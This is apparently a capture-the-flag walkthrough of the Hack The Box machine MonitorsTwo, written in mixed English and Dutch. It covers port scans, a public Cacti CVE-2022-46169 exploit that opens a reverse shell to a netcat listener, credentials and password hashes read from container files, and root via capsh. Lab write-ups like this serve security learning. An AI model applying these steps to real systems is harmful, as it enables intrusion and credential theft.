# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
└─$ nmap 10.129.228.231                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:55 CET
Nmap scan report for 10.129.228.231
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
└─$ nmap -p22,80 -sCV 10.129.228.231
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:56 CET
Nmap scan report for 10.129.228.231
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben naar de webpagina gaan kijken en daar kom je op een Cacti pagina terecht. Je kan daar zien dat de pagina op version 1.2.22 draait.

![[Pasted image 20251120203001.png]]

Ik ben als eerst gaan opzoeken wat de default credentials waren, maar daarmee kon ik niet inloggen op de website dus ben ik een exploit gaan zoeken voor de Cacti version 1.2.22 application. Hierbij ben ik op de volgende exploit gekomen https://github.com/ruycr4ft/CVE-2022-46169. Bij het uitvoeren van de applicatie zal je een listener op je eigen machine moeten starten en zal je zien dat als je de juiste gegevens intikt een connectie met de server krijgt.

```
┌──(kali㉿kali)-[~/HTB/MonitorsTwo/CVE-2022-46169]
└─$ python3 cacti.py
URL: http://monitorstwo.htb
Checking vulnerability...
App is vulnerable
Brute forcing id...
IP: 10.10.16.64
Port: 4444
Delivering payload...

┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.228.231 49464
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ 
```

Ik ben binnen de connectie met de user www-data gaan kijken wat voor interessante files er waren. Hierbij heb ik het entrypoint.sh file gevonden. Waar je de volgende data in de file zult kunnen zien.

```
cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"

```

Binnen deze file kan je zien dat er .sql file bestaat. Ik ben eens gaan kijken naar deze `cacti.sql` file en daar ben ik op de volgende gegevens gevonden die ik waarschijnlijk zal kunnen gebruiken voor inteloggen op de webpagina.

```
NSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);

INSERT INTO `automation_snmp_items` VALUES (1,1,1,'2','public',161,1000,3,10,-1,'admin','baseball','MD5','','DES','',''),(2,1,2,'2','private',161,1000,3,10,-1,'admin','baseball','MD5','','DES','','');
```

Ik ben deze hashes gaan proberen cracken door gebruik te maken van crackstation en hierbij kwam ik op de volgende gegevens.

```
|21232f297a57a5a743894a0e4a801fc3|md5|admin|

```
https://gtfobins.github.io/gtfobins/capsh/#suid
```
www-data@50bca5e748b0:/sbin$ capsh --gid=0 --uid=0 --
capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

bash entrypoint.sh
+ wait-for-it db:3306 -t 300 -- echo 'database is connected'
wait-for-it: waiting 300 seconds for db:3306
wait-for-it: db:3306 is available after 0 seconds
database is connected

mysql --host=db --user=root --password=root cacti -e 'select * from user_auth'

id      username        password        realm   full_name       email_address   must_change_password    password_change    show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees       policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked     failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb              on      on      on      on      on      2       1       1       1       1       on      -1-1       -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3 11       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                     on      on      on      on      1       1       1       1       1       on      -1-1               on      0       0       2135691668

```